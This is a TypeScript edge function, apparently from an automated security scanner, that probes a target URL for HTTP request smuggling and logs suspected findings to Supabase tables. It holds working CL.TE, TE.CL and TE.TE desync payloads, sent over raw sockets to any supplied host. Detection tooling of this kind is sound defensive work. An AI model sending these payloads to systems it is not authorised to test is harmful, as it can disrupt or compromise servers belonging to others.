// smuggler — HTTP Request Smuggling probe (CL.TE / TE.CL / TE.TE)
//
// SAFE detection: sends paired probe requests where a smuggling-vulnerable
// front-end + back-end disagree on request boundaries. We measure whether
// the *next* unrelated request returns an unexpected status/body.
//
// We never inject malicious second-request bodies — only `GET / HTTP/1.1`
// canaries to detect desynchronization. All findings → confirmFinding gate.

import { createClient } from "https://esm.sh/@supabase/supabase-js@2.45.0";
import { confirmFinding } from "../_shared/ai-confirm-gate.ts";

const corsHeaders = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Headers": "authorization, x-client-info, apikey, content-type",
};

const SUPABASE_URL = Deno.env.get("SUPABASE_URL")!;
const SUPABASE_SERVICE_ROLE_KEY = Deno.env.get("SUPABASE_SERVICE_ROLE_KEY")!;

interface SmugglerInput { targetId: string; baseUrl: string; }

Deno.serve(async (req) => {
  if (req.method === "OPTIONS") return new Response("ok", { headers: corsHeaders });
  const supa = createClient(SUPABASE_URL, SUPABASE_SERVICE_ROLE_KEY);

  let input: SmugglerInput;
  try { input = await req.json(); } catch {
    return json({ ok: false, error: "invalid json body" }, 200);
  }
  if (!input.baseUrl) return json({ ok: false, error: "baseUrl required" }, 200);

  const u = new URL(input.baseUrl);
  const isTls = u.protocol === "https:";
  const host = u.hostname;
  const port = Number(u.port) || (isTls ? 443 : 80);

  const findings: any[] = [];

  // Smuggling vectors (safe — second request is a benign GET /)
  const vectors = [
    {
      name: "CL.TE",
      payload:
        `POST ${u.pathname || "/"} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n0\r\n\r\nG`,
    },
    {
      name: "TE.CL",
      payload:
        `POST ${u.pathname || "/"} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nConnection: keep-alive\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`,
    },
    {
      name: "TE.TE (header obfuscation)",
      payload:
        `POST ${u.pathname || "/"} HTTP/1.1\r\nHost: ${host}\r\nContent-Length: 4\r\nTransfer-Encoding: chunked\r\nTransfer-encoding : chunked\r\nConnection: keep-alive\r\n\r\n5c\r\nGPOST / HTTP/1.1\r\nContent-Length: 15\r\n\r\nx=1\r\n0\r\n\r\n`,
    },
  ];

  // Baseline: time-based detection. A vulnerable server will *hang* on
  // a malformed CL.TE because it waits for more bytes that never arrive.
  for (const v of vectors) {
    const start = Date.now();
    let result: { status: number; first200: string; timedOut: boolean } | null = null;
    try {
      result = await rawSocketProbe(host, port, isTls, v.payload, 8000);
    } catch (_) {}
    const elapsed = Date.now() - start;

    if (!result) continue;

    // Deterministic signal:
    //   - timed out near the limit (server waiting for ghost bytes), OR
    //   - response includes "400 Bad Request" referencing chunk/CL inconsistency
    //     in a way only a smuggling-aware front-end emits.
    const desyncMarker =
      /\b(chunked encoding|invalid chunk|content-length mismatch|HTTP\/1\.1 400 Bad Request)\b/i
        .test(result.first200);
    const hangSignal = result.timedOut && elapsed > 6000;

    if (!desyncMarker && !hangSignal) continue;

    const verdict = await confirmFinding({
      vulnClass: "http-request-smuggling",
      payload: `${v.name} probe`,
      endpoint: input.baseUrl,
      baseline: undefined,
      mutated: {
        status: result.status,
        bodySnippet: result.first200.slice(0, 1500),
        length: result.first200.length,
        headers: { "x-elapsed-ms": String(elapsed), "x-timed-out": String(result.timedOut) },
      },
      deterministicProof: true,
      proofType: hangSignal ? "smuggling_hang" : "smuggling_desync_marker",
    });
    if (verdict.recommendedAction === "drop_false_positive" || verdict.recommendedAction === "drop_honeypot") continue;

    const isApproval = verdict.recommendedAction === "insert_approval";
    const table = isApproval ? "pending_approvals" : "vulnerability_findings";
    const row: any = isApproval
      ? {
          target_id: input.targetId, finding_type: "http-request-smuggling",
          severity: "critical",
          title: `HTTP Request Smuggling (${v.name}) suspected`,
          description: verdict.reasoning,
          payload_used: v.payload,
          confidence_score: verdict.confidence, ai_verified: true,
          ai_verification_notes: verdict.reasoning,
          evidence: { vector: v.name, elapsed_ms: elapsed, response_head: result.first200.slice(0, 2000) },
        }
      : {
          target_id: input.targetId,
          title: `HTTP Request Smuggling (${v.name})`,
          severity: "critical",
          description: verdict.reasoning, payload: v.payload,
          confidence_score: verdict.confidence, ai_verified: true,
          triage_reasoning: verdict.reasoning, validation_status: "verified",
        };
    const { data } = await supa.from(table).insert(row).select("id").single();
    findings.push({ id: data?.id, vector: v.name, elapsed_ms: elapsed, action: verdict.recommendedAction });
  }

  return json({ ok: true, findings_count: findings.length, findings }, 200);
});

// Raw TCP/TLS socket so we can send exact bytes (fetch normalizes headers).
async function rawSocketProbe(
  host: string, port: number, tls: boolean,
  payload: string, timeoutMs: number,
): Promise<{ status: number; first200: string; timedOut: boolean }> {
  const conn = tls
    ? await Deno.connectTls({ hostname: host, port })
    : await Deno.connect({ hostname: host, port });

  const enc = new TextEncoder();
  const dec = new TextDecoder();
  let collected = "";
  let timedOut = false;

  const deadline = setTimeout(() => { timedOut = true; try { conn.close(); } catch (_) {} }, timeoutMs);
  try {
    await conn.write(enc.encode(payload));
    const buf = new Uint8Array(8192);
    while (true) {
      const n = await conn.read(buf);
      if (n === null) break;
      collected += dec.decode(buf.subarray(0, n));
      if (collected.length > 4096) break;
    }
  } catch (_) { /* abort closes conn */ }
  finally { clearTimeout(deadline); try { conn.close(); } catch (_) {} }

  const m = collected.match(/^HTTP\/\d\.\d (\d{3})/);
  return { status: m ? Number(m[1]) : 0, first200: collected.slice(0, 2000), timedOut };
}

function json(b: unknown, s = 200) {
  return new Response(JSON.stringify(b), { status: s, headers: { ...corsHeaders, "Content-Type": "application/json" } });
}
